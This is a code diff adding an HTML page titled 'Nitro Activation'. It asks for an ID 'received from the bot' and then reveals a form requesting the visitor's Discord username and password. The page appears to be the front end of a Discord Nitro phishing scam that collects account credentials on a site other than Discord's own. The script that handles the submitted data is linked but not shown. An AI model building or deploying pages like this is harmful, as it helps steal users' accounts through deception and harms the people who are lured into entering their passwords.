@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nitro Activation</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="form-container">
+            <h1>Nitro Activation</h1>
+            <p>Enter the Unique ID received from the bot:</p>
+            <form id="uniqueIdForm">
+                <input type="text" id="uniqueId" name="uniqueId" required>
+                <button type="submit">Activate</button>
+            </form>
+            <form id="loginForm" style="display:none;">
+                <h2>Login with Discord</h2>
+                <input type="text" id="discordUsername" name="discordUsername" placeholder="Discord Username" required>
+                <input type="password" id="discordPassword" name="discordPassword" placeholder="Discord Password" required>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+    <script src="scripts.js"></script>
+</body>
+</html>
